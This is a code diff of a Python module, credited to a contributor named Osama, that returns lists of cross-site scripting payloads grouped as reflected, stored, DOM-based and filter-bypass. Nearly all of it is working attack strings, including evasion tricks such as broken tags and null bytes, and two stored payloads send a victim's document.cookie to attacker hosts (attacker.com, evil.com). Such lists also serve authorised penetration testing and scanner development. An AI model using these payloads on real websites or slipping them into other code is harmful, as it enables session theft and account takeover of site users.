@@ -1,18 +1,45 @@
-def generate_xss():
-    """
-    Generates a list of XSS payloads with basic and evasion techniques.
-    """
-    payloads = [
-        # Basic payloads
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg onload=alert('XSS')>",
+# XSS Payload Module
+# Contributed by Osama - July 2025
 
-        # Evasion techniques
-        "<svg><script>alert('XSS')</script></svg>",           # Nested SVG
-        "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>",  # srcdoc abuse
-        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",  # Char codes
-        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",      # Broken tag trick
-        "<body onresize=alert('XSS')>",                       # Event-based
+def get_reflected_payloads():
+    return [
+        '<script>alert("XSS")</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '\"><script>alert(1)</script>',
     ]
-    return payloads
+
+def get_stored_payloads():
+    return [
+        '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
+        '<img src="x" onerror="document.location=`http://evil.com?xss=`+document.cookie">',
+        '<iframe srcdoc="<script>alert(1)</script>">',
+    ]
+
+def get_dom_payloads():
+    return [
+        '<input autofocus onfocus=alert(1)>',
+        '<a href="#" onclick="alert(1)">Click</a>',
+        '<body onload=alert(1)>',
+        '<script>document.write(location.hash)</script>',
+    ]
+
+def get_bypass_payloads():
+    return [
+        '<svg><script>confirm(1)</script>',
+        '<iframe srcdoc="<script>alert`1`</script>">',
+        '<img src=x%00 onerror=alert(1)>',
+        '<svg/onload=alert`1`>',
+        '<scr<script>ipt>alert(1)</scr</script>ipt>',
+    ]
+
+def get_all_payloads():
+    """
+    Returns all XSS payloads: reflected, stored, DOM-based, and bypass.
+    """
+    return (
+        get_reflected_payloads()
+        + get_stored_payloads()
+        + get_dom_payloads()
+        + get_bypass_payloads()
+    )
